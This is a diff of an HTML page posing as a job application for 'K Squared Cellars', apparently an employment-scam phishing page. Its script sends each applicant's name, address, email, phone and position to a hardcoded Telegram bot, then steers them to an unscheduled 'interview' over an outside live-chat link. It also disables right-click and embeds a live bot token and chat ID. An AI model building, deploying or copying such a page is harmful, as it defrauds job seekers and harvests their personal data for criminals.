@@ -1,194 +1,206 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>K Squared Cellars - Job Application</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
-        .header {
-            background: #004080; 
-            color: white; 
-            width: 100%;
-            height: 109px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-        .container { padding: 20px; text-align: center; }
-        .btn { background: #004080; color: white; padding: 10px 20px; text-decoration: none; display: inline-block; }
-        .form-container { max-width: 400px; margin: auto; padding: 20px; background: #f9f9f9; border-radius: 5px; }
-        input, select { width: 100%; padding: 8px; margin: 5px 0; }
-        button { background: #004080; color: white; padding: 10px; width: 100%; border: none; cursor: pointer; }
-        .success-message { text-align: center; color: green; font-size: 20px; font-weight: bold; display: none; }
-        .interview-details { 
-            padding: 15px; 
-            background: #f9f9f9; 
-            border-radius: 5px; 
-            margin-top: 20px; 
-            width: 80%; 
-            margin-left: auto; 
-            margin-right: auto; 
-            max-width: 800px;
-            display: none;
-        }
-        h2 { text-align: center; color: #004080; }
-        .interview-details p { font-size: 16px; line-height: 1.5; }
-        .interview-details ul { text-align: left; margin: 0 auto; padding: 0; font-size: 16px; list-style: none; width: 80%; }
-        .interview-details h3 {
-            margin-top: 20px;
-        }
-        .center-me {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            margin-top: 20px;
-        }
-        .center-me p, .center-me ul {
-            text-align: center;
-        }
-        .center-me ul {
-            display: inline-block;
-            text-align: left;
-        }
-        .center-me h3 {
-            margin-top: 20px;
-        }
-        .contact-us {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            font-size: 18px;
-        }
-        .contact-us a {
-            color: white;
-            text-decoration: none;
-        }
-        .contact-page {
-            display: none;
-            padding: 20px;
-            text-align: center;
-        }
-        .contact-page h2 {
-            color: #004080;
-        }
-        .contact-page p {
-            font-size: 16px; color: #333;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>K Squared Cellars - Job Application</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
+    .header {
+      background: #004080;
+      color: white;
+      width: 100%;
+      height: 109px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .container { padding: 20px; text-align: center; }
+    .form-container {
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
+      background: #f9f9f9;
+      border-radius: 5px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin: 5px 0;
+    }
+    button {
+      background: #004080;
+      color: white;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      cursor: pointer;
+    }
+    .success-message {
+      text-align: center;
+      color: green;
+      font-size: 20px;
+      font-weight: bold;
+      display: none;
+    }
+    .interview-details {
+      padding: 15px;
+      background: #f9f9f9;
+      border-radius: 5px;
+      margin-top: 20px;
+      width: 80%;
+      margin-left: auto;
+      margin-right: auto;
+      max-width: 800px;
+      display: none;
+    }
+    h2 { text-align: center; color: #004080; }
+    .interview-details p { font-size: 16px; line-height: 1.5; }
+    .interview-details ul {
+      text-align: left;
+      margin: 0 auto;
+      padding: 0;
+      font-size: 16px;
+      list-style: none;
+      width: 80%;
+    }
+    .center-me {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      margin-top: 20px;
+    }
+    .center-me p, .center-me ul { text-align: center; }
+    .center-me ul { display: inline-block; text-align: left; }
+    .contact-us {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 18px;
+    }
+    .contact-us a {
+      color: white;
+      text-decoration: none;
+    }
+    .contact-page {
+      display: none;
+      padding: 20px;
+      text-align: center;
+    }
+    .contact-page h2 { color: #004080; }
+    .contact-page p { font-size: 16px; color: #333; }
+  </style>
 </head>
 <body oncontextmenu="return false">
-    <div class="header">
-        <h1>K Squared Cellars</h1>
+  <div class="header">
+    <h1>K Squared Cellars</h1>
+  </div>
+
+  <div class="container">
+    <h2>Join Our Team</h2>
+  </div>
+
+  <div class="contact-us">
+    <a href="javascript:void(0)" onclick="showContactPage()">Contact Us</a>
+  </div>
+
+  <div class="form-container" id="apply">
+    <h2>Job Application Form</h2>
+    <form id="jobForm">
+      <input type="text" id="name" placeholder="Full Name" required>
+      <input type="text" id="address" placeholder="Mailing Address" required>
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="text" id="phone" placeholder="Phone Number" required>
+      <select id="position" required>
+        <option value="">Select Position</option>
+        <option value="Data Entry Clerk">Data Entry Clerk</option>
+        <option value="Administrative Assistant">Administrative Assistant</option>
+        <option value="Customer Service Representative">Customer Service Representative</option>
+        <option value="Mail Clerk">Mail Clerk</option>
+        <option value="Executive Assistant">Executive Assistant</option>
+        <option value="Delivery Driver">Delivery Driver</option>
+        <option value="Mystery Shopper">Mystery Shopper</option>
+        <option value="Feedback Specialists">Feedback Specialists</option>
+      </select>
+      <button type="submit">Submit Application</button>
+    </form>
+    <div class="success-message" id="success-message">Application Successfully Submitted!</div>
+  </div>
+
+  <div class="interview-details" id="interviewDetails">
+    <div class="center-me">
+      <h2>Interview Invitation: Discuss Your Role</h2>
+      <p>As part of our commitment to understanding each team member’s experience and ensuring the necessary support for success, we’d like to schedule a brief interview with you.</p>
+      <p>In response to the large number of applicants, we’ve moved all interviews online. This ensures an easier, faster process for candidates, who can join from their laptops or phones.</p>
+      <p><strong>During this conversation, we’ll discuss:</strong></p>
+      <ul>
+        <li>Your current role and responsibilities</li>
+        <li>Any challenges you may be facing</li>
+        <li>Ways to improve processes and team collaboration</li>
+        <li>Your feedback on how K Squared Cellars can better support you</li>
+      </ul>
+      <h3>Interview Details:</h3>
+      <ul>
+        <li>Days: Monday – Friday</li>
+        <li>Time: 8:00 AM – 6:00 PM EST</li>
+        <li>Duration: 20–30 minutes</li>
+        <li>Join via: <a href="https://direct.lc.chat/16972020" target="_blank">Live Chat Link</a></li>
+      </ul>
+      <p>You don’t need to schedule a time — just join during hours listed above. We look forward to speaking with you!</p>
     </div>
+  </div>
 
-    <div class="container">
-        <h2>Join Our Team</h2>
-    </div>
+  <div class="contact-page" id="contactPage">
+    <h2>Our Offices</h2>
+    <p><strong>California</strong><br>Corporate Office<br>7975 Cameron Dr., Bldg. 1500-A, Windsor, CA 95492<br>+1 (818) 296-2990</p>
+    <p><strong>California</strong><br>Branch Office<br>780 Roosevelt STE, Irvine, CA 92620<br>+1 (800) 492-1135</p>
+    <p><strong>Mumbai (India)</strong><br>219-B, New Sonal Link Ind. Estate Off Link Rd, Opp Movie Time Cinema, Malad (W), Mumbai 400064</p>
+  </div>
 
-    <div class="contact-us">
-        <a href="javascript:void(0)" onclick="showContactPage()">Contact Us</a>
-    </div>
+  <script>
+    // Disable right-click
+    document.addEventListener('contextmenu', event => event.preventDefault());
 
-    <div class="form-container" id="apply">
-        <h2>Job Application Form</h2>
-        <form id="jobForm">
-            <input type="text" id="name" placeholder="Full Name" required>
-            <input type="text" id="address" placeholder="Mailing Address" required>
-            <input type="email" id="email" placeholder="Email" required>
-            <input type="text" id="phone" placeholder="Phone Number" required>
-            <select id="position" required>
-                <option value="">Select Position</option>
-                <option value="Data Entry Clerk">Data Entry Clerk</option>
-                <option value="Administrative Assistant">Administrative Assistant</option>
-                <option value="Customer Service Representative">Customer Service Representative</option>
-                <option value="Mail Clerk">Mail Clerk</option>
-                <option value="Executive Assistant">Executive Assistant</option>
-                <option value="Delivery Driver">Delivery Driver</option>
-                <option value="Mystery Shopper">Mystery Shopper</option>
-                <option value="Feedback Specialists">Feedback Specialists</option>
-            </select>
-            <button type="submit">Submit Application</button>
-        </form>
-        <div class="success-message" id="success-message">Application Successfully Submitted!</div>
-    </div>
+    // Show Contact Page
+    function showContactPage() {
+      document.querySelector('.container').style.display = 'none';
+      document.querySelector('.form-container').style.display = 'none';
+      document.querySelector('.interview-details').style.display = 'none';
+      document.querySelector('.contact-page').style.display = 'block';
+    }
 
-    <div class="interview-details" id="interviewDetails">
-        <div class="center-me">
-            <h2>Interview Invitation: Discuss Your Role</h2>
-            <p>As part of our commitment to understanding each team member’s experience and ensuring the necessary support for success, we’d like to schedule a brief interview with you.</p>
-            <p>In response to the large number of applicants, we’ve moved all interviews online. This ensures an easier, faster process for candidates, who can join from their laptops or phones. Please note that our office is in the final stages of preparation, but we look forward to connecting virtually. We’ll ensure a smooth interview experience. Our HR team is available Monday to Friday, from 8:00 AM to 10:00 PM EST. Simply join the live chat link during this timeframe at your convenience.</p>
-            <p><strong>During this conversation, we’ll discuss:</strong></p>
-            <ul>
-                <li>Your current role and responsibilities</li>
-                <li>Any challenges you may be facing</li>
-                <li>Ways to improve processes and team collaboration</li>
-                <li>Your feedback on how K Squared Cellars can better support you</li>
-            </ul>
-            <h3>Interview Details:</h3>
-            <ul>
-                <li>Days: Monday – Friday</li>
-                <li>Time: Anytime between 8:00 AM – 6:00 PM EST (join when it’s convenient for you)</li>
-                <li>Duration: 20–30 minutes</li>
-                <li>Join via: <a href="https://direct.lc.chat/16972020" target="_blank">Live Chat Link</a></li>
-            </ul>
-            <p>You don’t need to schedule a time—just click the link and join at your convenience during the available hours. We look forward to speaking with you!</p>
-        </div>
-    </div>
+    // Form Submission
+    document.getElementById("jobForm").addEventListener("submit", function(event) {
+      event.preventDefault();
 
-    <div class="contact-page" id="contactPage">
-        <h2>Our Offices</h2>
-        <p><strong>California</strong><br>Corporate Office<br>7975 Cameron Dr., Bldg. 1500-A,  Windsor, California 95492, United States<br>+1 (818) 296-2990</p>
-        <p><strong>California</strong><br>Branch Office<br>780 Roosevelt STE, Irvine, CA 92620, United States<br>+1 (800) 492-1135</p>
-        <p><strong>Mumbai (India)</strong><br>Offshore Office<br>219-B, New Sonal Link Ind. Estate Off Link Road, Opp Movie Time Cinema Malad (West), Mumbai 400 064<br></p>
-    </div>
+      let name = document.getElementById("name").value;
+      let address = document.getElementById("address").value;
+      let email = document.getElementById("email").value;
+      let phone = document.getElementById("phone").value;
+      let position = document.getElementById("position").value;
 
-    <script>
-        // Disable right-click
-        document.addEventListener('contextmenu', event => event.preventDefault());
+      let message = `New Application:\nName: ${name}\nAddress: ${address}\nEmail: ${email}\nPhone: ${phone}\nPosition: ${position}`;
 
-        // Function to show Contact Us page
-        function showContactPage() {
-            document.querySelector('.container').style.display = 'none';
+      let telegram_bot_token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
+      let telegram_chat_id = "1461764555";
+      let telegram_url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage?chat_id=${telegram_chat_id}&text=${encodeURIComponent(message)}`;
+
+      fetch(telegram_url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
             document.querySelector('.form-container').style.display = 'none';
-            document.querySelector('.interview-details').style.display = 'none';
-            document.querySelector('.contact-page').style.display = 'block';
-        }
-
-        // Handle Job Form submission
-        document.getElementById("jobForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-            
-            let name = document.getElementById("name").value;
-            let address = document.getElementById("address").value;
-            let email = document.getElementById("email").value;
-            let phone = document.getElementById("phone").value;
-            let position = document.getElementById("position").value;
-            
-            let message = `New Application:\nName: ${name}\nAddress: ${address}\nEmail: ${email}\nPhone: ${phone}\nPosition: ${position}`;
-            
-            let telegram_bot_token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
-            let telegram_chat_id = "1461764555";
-            let telegram_url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage?chat_id=${telegram_chat_id}&text=${encodeURIComponent(message)}`;
-            
-            fetch(telegram_url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        document.querySelector('.form-container').style.display = 'none';
-                        document.getElementById('applyButton')?.remove();
-                        document.getElementById("interviewDetails").style.display = 'block';
-                    } else {
-                        alert('Failed to submit application. Please try again.');
-                    }
-                })
-                .catch(error => {
-                    alert('An error occurred while submitting the application. Please try again.');
-                });
+            document.getElementById("interviewDetails").style.display = 'block';
+          } else {
+            alert('Failed to submit application. Please try again.');
+          }
+        })
+        .catch(error => {
+          alert('An error occurred while submitting the application. Please try again.');
         });
-    </script>
+    });
+  </script>
 </body>
 </html>
